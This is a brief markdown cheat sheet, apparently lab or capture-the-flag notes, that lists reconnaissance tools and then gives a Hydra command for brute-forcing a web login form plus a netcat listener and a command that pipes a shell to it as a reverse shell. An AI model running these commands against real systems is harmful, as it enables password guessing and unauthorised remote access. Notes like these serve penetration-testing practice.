## Information gathering

- `nmap`, `nikto`
- `gobuster`, `dirbuster`
- `robots.txt`

## Hydra post bruteforce

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

## Netcat reverse shell

- Listen : `nc -lvnp 5555`
- Start shell : `/bin/sh | nc 127.0.0.1 5555`